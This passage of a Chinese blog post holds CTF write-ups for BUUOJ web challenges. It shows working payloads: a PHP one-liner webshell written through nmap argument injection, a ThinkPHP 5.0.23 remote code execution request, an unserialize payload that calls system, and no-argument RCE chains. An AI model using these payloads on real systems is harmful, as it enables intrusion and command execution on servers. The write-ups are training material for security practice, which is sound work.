class="token punctuation">=</span><span class="token value attr-value">gyy.jpg  //解析后进行包含，它包含在所有php文件执行后执行</span></code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201203161427723.png" class="" title="image-20201203161427723" loading="lazy"><p>ok,再传码</p><img src="/article/Buuoj-WEB-Write-up/image-20201203161504788.png" class="" title="image-20201203161504788" loading="lazy"><p>然后直接访问<code>index.php</code>就可以了，因为<code>.user.ini</code>里写了，提前加载了<code>gyy.jpg</code>文件，而里面是我们写好的码，shell直接连上</p><img src="/article/Buuoj-WEB-Write-up/image-20201203161829593.png" class="" title="image-20201203161829593" loading="lazy"><hr><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>记录一道特殊的题， 很简单的web题，但是需要对java容器和项目存放位置比较了解，作为web选手，应该要对几大语言的容器，项目环境，有所了解。</p><p>考点：<strong>WEB-INF&#x2F;web.xml泄露</strong></p><pre class="language-none"><code class="language-none">WEB-INF主要包含一下文件或目录:&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201208175741483.png" class="" title="image-20201208175741483" loading="lazy"><p>打开为登陆界面，SQL注入无果，点<code>help</code>，发现url变化为<code>./Download?filename=help.docx</code></p><p>猜测源码泄露，尝试伪协议读取源码<code>php://filter/convert.base64-encode/resource=help.docx</code>发现报错为<code>java.io.FileNotFoundException:&#123;php://filter/convert.base64-encode/resource=help.docx&#125;</code></p><p>结合题目名，猜测JAVA-WEB应用</p><p>报错是tomcat，尝试包含tomcat的web.xml，更改方式为POST请求，传参<code>filename=WEB-INF/web.xml</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201208180232236.png" class="" title="image-20201208180232236" loading="lazy"><p>尝试请求<code>/Flag</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201208180450678.png" class="" title="image-20201208180450678" loading="lazy"><p> 结合tomcat的项目存放路径经验试试下载FlagController.class </p><p>传参<code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201208180558946.png" class="" title="image-20201208180558946" loading="lazy"><p>直接访问下载也行，抓包请求也行，base64解码一下发现flag</p><img src="/article/Buuoj-WEB-Write-up/image-20201208180825474.png" class="" title="image-20201208180825474" loading="lazy"><hr><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>nmap工具的利用</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glzjin"</span><span class="token operator">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'you are in sandbox '</span><span class="token operator">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token operator">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>考两个函数<code>escapeshellarg</code></p><p> <strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 </p><p><code>escapeshellarg</code></p><p> <strong>escapeshellarg()</strong> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。 </p><p>然而之前就爆出了漏洞… 当先使用 escapeshellarg 再使用 escapeshellcmd 时，就可能导致命令参数注入。 </p><p>如</p><p><code>curl &#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1\&#39;</code></p><p>相当于<code>curl 127.0.0.1\ -v -d a=1&#39;</code></p><p>字符转义了</p><p>查阅nmap帮助手册<code>nmap -h</code></p><p>首先想读取文件，利用<code>-iL</code>参数</p><img src="/article/Buuoj-WEB-Write-up/image-20201208184745868.png" class="" title="image-20201208184745868" loading="lazy"><p>发现不行，cmd可以，但执行后没有回显，以下为本地环境</p><img src="/article/Buuoj-WEB-Write-up/image-20201208190824314.png" class="" title="image-20201208190824314" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201208190921276.png" class="" title="image-20201208190921276" loading="lazy"><p>关键在于没法构造，毕竟两函数有转义的，于是有了另一种方法，输出。</p><p>利用<code>-oG</code>参数</p><img src="/article/Buuoj-WEB-Write-up/image-20201208184653935.png" class="" title="image-20201208184653935" loading="lazy"><p>直接写一句话木马就好了</p><p>payload&#x3D;<code>./?host=&#39;&lt;?php eval($_POST[gyy]);?&gt; -oG shell.php &#39;</code></p><p>最后和单引号要有空格，因为让system执行时最后的参数是<code>shell.php</code>而不是<code>shell.php\&#39;</code>，因为 <strong>escapeshellarg()<strong>和</strong>escapeshellcmd()</strong> 有转义，单引号是因为函数会检查字符串匹配引号的情况</p><img src="/article/Buuoj-WEB-Write-up/image-20201208193014462.png" class="" title="image-20201208193014462" loading="lazy"><p>查看文件</p><img src="/article/Buuoj-WEB-Write-up/image-20201208193048924.png" class="" title="image-20201208193048924" loading="lazy"><p>拿到shell</p><img src="/article/Buuoj-WEB-Write-up/image-20201208193135957.png" class="" title="image-20201208193135957" loading="lazy"><p>本地文件是这样的，可以看到包含了一句话木马</p><img src="/article/Buuoj-WEB-Write-up/image-20201208193533711.png" class="" title="image-20201208193533711" loading="lazy"><hr><h2 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h2><h5 id="cve-2020-7066"><a href="#cve-2020-7066" class="headerlink" title="cve-2020-7066"></a>cve-2020-7066</h5><p> <strong>将get_headers（）与用户提供的URL一起使用时</strong>，如果URL包含零（\ 0）字符，则URL将被静默地<strong>截断</strong>。<strong>这可能会导致某些软件对get_headers（）的目标做出错误的假设，并可能将某些信息发送到错误的服务器。</strong> </p><p>题目讲明为CVE，排除SSRF</p><p>在响应头中发现hint</p><img src="/article/Buuoj-WEB-Write-up/image-20201208195802041.png" class="" title="image-20201208195802041" loading="lazy"><p>访问<code>./?url=http://localhost%00www.ctfhub.com</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201208195922474.png" class="" title="image-20201208195922474" loading="lazy"><p><code>Tips: Host must be end with &#39;123&#39;</code></p><p>访问<code>./?url=http://127.0.0.123%00www.ctfhub.com</code>即可</p><img src="/article/Buuoj-WEB-Write-up/image-20201208200037696.png" class="" title="image-20201208200037696" loading="lazy"><p>主要考一个CVE，记录一下</p><hr><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>git泄露</p><p>一点提示都没有！可恶</p><p><code>robots.txt</code>没有，响应头没有，随手访问了个<code>./.git/</code>结果真有，直接上GitHack</p><img src="/article/Buuoj-WEB-Write-up/image-20201208202421537.png" class="" title="image-20201208202421537" loading="lazy"><p>强烈谴责！GitHack重新下个就好了，旧的这个还不管用，GitHack还有假的？？？</p><img src="/article/Buuoj-WEB-Write-up/image-20201208203755631.png" class="" title="image-20201208203755631" loading="lazy"><p>得到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"flag在哪里呢？&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// echo $_GET['exp'];</span>                @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// highlight_file(__FILE__);</span><span class="token delimiter important">?></span></span></code></pre><p>很好，看到这个<code>&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;]</code>妥妥的无参数RCE</p><p>过滤一堆</p><p>先扫当前目录</p><p>payload&#x3D;<code>./?exp=print_r(scandir(current(localeconv())));</code></p><pre class="language-bash" data-language="bash"><code class="language-bash">localeconv<span class="token punctuation">(</span><span class="token punctuation">)</span>: 返回一包含本地数字及货币格式信息的数组。如下图current<span class="token punctuation">(</span><span class="token punctuation">)</span>: 取数组中第一个元素，返回数组中的当前单元。current<span class="token punctuation">(</span>localeconv<span class="token punctuation">(</span><span class="token punctuation">))</span>: 取符号.scandir<span class="token punctuation">(</span><span class="token punctuation">)</span>: 扫描目录scandir<span class="token punctuation">(</span>current<span class="token punctuation">(</span>localeconv<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span>： 等同于scandir<span class="token punctuation">(</span>.<span class="token punctuation">)</span>，即扫描当前目录print_r<span class="token punctuation">(</span><span class="token punctuation">)</span>： 输出</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201208205457822.png" class="" title="image-20201208205457822" loading="lazy"><p>localeconv()如图所示</p><img src="/article/Buuoj-WEB-Write-up/image-20201208205704606.png" class="" title="image-20201208205704606" loading="lazy"><p>current(localeconv())取到了符号.</p><img src="/article/Buuoj-WEB-Write-up/image-20201208205956327.png" class="" title="image-20201208205956327" loading="lazy"><p>发现了flag.php</p><p>下面要取flag.php中的内容，flag.php在倒数第二组</p><p>由于没有禁用session，利用session<del>（我最喜欢</del></p><img src="/article/Buuoj-WEB-Write-up/image-20201208210427209.png" class="" title="~" loading="lazy"><p>其他方法</p><p>payload&#x3D;<code>./?exp=readfile(array_rand(array_flip(scandir(current(localeconv())))));</code></p><pre class="language-none"><code class="language-none">array_flip()： 交换数组的键和值array_rand()： 从数组中随机取出一个或多个单元readfile()： 读文件</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201208211502701.png" class="" title="image-20201208211502701" loading="lazy"><p>有点小运气嗷，可以写脚本跑，反正随机嘛…概率问题</p><p>读源码方法</p><pre class="language-none"><code class="language-none">file_get_contents()： 本题被banview-source:highlight_file()show_source()readfile()</code></pre><hr><h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><h5 id="thinkphp5-0-23-远程代码执行-漏洞"><a href="#thinkphp5-0-23-远程代码执行-漏洞" class="headerlink" title="thinkphp5.0.23 远程代码执行 漏洞"></a>thinkphp5.0.23 远程代码执行 漏洞</h5><p>payload：</p><p>POST</p><pre class="language-none"><code class="language-none">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag</code></pre><hr><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><img src="/article/Buuoj-WEB-Write-up/image-20201210190510038.png" class="" title="image-20201210190510038" loading="lazy"><p>打开一会发现网页自动刷新了，抓包看看</p><img src="/article/Buuoj-WEB-Write-up/image-20201210190602388.png" class="" title="image-20201210190602388" loading="lazy"><p>自动刷新</p><pre class="language-none"><code class="language-none">setTimeout(&quot;document.form1.submit()&quot;,5000)</code></pre><p>怀疑调用函数，尝试传参</p><pre class="language-none"><code class="language-none">func&#x3D;file_get_contents&amp;p&#x3D;index.php</code></pre><p>得到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$disable_fun</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"shell_exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"passthru"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"proc_open"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"show_source"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"popen"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"dl"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"eval"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"proc_terminate"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"touch"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"escapeshellcmd"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"escapeshellarg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"assert"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"substr_replace"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"call_user_func_array"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"call_user_func"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"array_filter"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_walk"</span><span class="token punctuation">,</span>  <span class="token string double-quoted-string">"array_map"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"registregister_shutdown_function"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"register_tick_function"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"filter_var"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"filter_var_array"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uasort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uksort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_reduce"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"array_walk"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_walk_recursive"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pcntl_exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"fopen"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"fwrite"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"file_put_contents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Y-m-d h:i:s a"</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"date"</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$func</span> <span class="token operator">!=</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$disable_fun</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hacker..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>分析发现禁用了不少函数，调用了<code>call_user_func()</code>函数，可能存在命令执行。</p><p><code>gettype()</code>函数限制执行后返回必须为String类型。</p><p>观察发现，本题只对传入参数进行一次waf，代码中还给了个类Test，类中调用<code>gettime()</code>函数不会被waf，于是可用序列化方法，将代码序列化传入，再反序列化执行命令。</p><p>尝试传参</p><pre class="language-none"><code class="language-none">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201210191635044.png" class="" title="image-20201210191635044" loading="lazy"><p>再扫根目录文件</p><pre class="language-none"><code class="language-none">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:4:&quot;ls &#x2F;&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201210192034277.png" class="" title="image-20201210192034277" loading="lazy"><p>根目录没发现flag，利用system来找一下，<code>find / -name fla*</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201210192305790.png" class="" title="image-20201210192305790" loading="lazy"><p>发现了奇怪的东西，打开即为flag</p><img src="/article/Buuoj-WEB-Write-up/image-20201210192428939.png" class="" title="image-20201210192428939" loading="lazy"><p>payload：</p><pre class="language-none"><code class="language-none">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat &#x2F;tmp&#x2F;flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><hr><h2 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h2><h5 id="Http-Header"><a href="#Http-Header" class="headerlink" title="Http Header"></a>Http Header</h5><p>考验http请求头，打开随便登陆底部源码提示<code>&lt;!-- L0g1n.php --&gt;</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201210194805424.png" class="" title="image-20201210194805424" loading="lazy"><ol><li>提示<code>Sorry, this site will be available after totally 99 years!</code></li></ol><p>修改Cookie中<code>time=9999999999</code></p><ol start="2"><li>提示<code>Sorry, this site is only optimized for those who comes from localhost</code></li></ol><p>添加<code>X-Forwarded-For: 127.0.0.1</code></p><p>提示<code>Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive·</code></p><p>添加<code>Client-IP: 127.0.0.1</code></p><ol start="3"><li>提示<code>Sorry, this site is only optimized for those who come from gem-love.com</code></li></ol><p>添加<code>Referer: gem-love.com</code></p><ol start="4"><li>提示<code>Sorry, this site is only optimized for browsers that run on Commodo 64</code></li></ol><p>资料：科摩多64位安全浏览器的UA为 Commodore 64 </p><p>修改<code>User-Agent: Commodore 64</code></p><ol start="5"><li>提示<code>Sorry, this site is only optimized for those whose email is root@gem-love.com</code></li></ol><p>添加<code>Sorry, this site is only optimized for those who use the http proxy of y1ng.vip&lt;br&gt; if you dont have the proxy, pls contact us to buy, ￥100/Month</code></p><ol start="6"><li>提示<code>Sorry, this site is only optimized for those who use the http proxy of y1ng.vip&lt;br&gt; if you dont have the proxy, pls contact us to buy, ￥100/Month</code></li></ol><p>添加<code>Via: y1ng.vip</code></p><p>提示</p><pre class="language-none"><code class="language-none">Sorry, even you are good at http header, you&#39;re still not my admin.&lt;br&gt; Althoungh u found me, u still dont know where is flag &lt;!--&#123;一段base64编码&#125;--&gt;</code></pre><p>base64解码注释得flag，可能原题这边只是给下一题的方向，没有直接给flag，这边做题简单化了吧…</p><p>最终payload：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span> <span class="token operator">/</span>L0g1n<span class="token operator">.</span>php <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> node3<span class="token operator">.</span>buuoj<span class="token operator">.</span>cn<span class="token punctuation">:</span><span class="token number">26256</span>Cache<span class="token operator">-</span>Control<span class="token punctuation">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>Upgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token punctuation">:</span> <span class="token number">1</span>User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Commodore <span class="token number">64</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>application<span class="token operator">/</span>signed<span class="token operator">-</span>exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflateAccept<span class="token operator">-</span>Language<span class="token punctuation">:</span> zh<span class="token operator">-</span><span class="token constant">CN</span><span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>Cookie<span class="token punctuation">:</span> UM_distinctid<span class="token operator">=</span><span class="token number">1762</span>cb225c986d<span class="token operator">-</span><span class="token number">0970</span>f0908a83e6<span class="token operator">-</span><span class="token number">3323766</span><span class="token operator">-</span><span 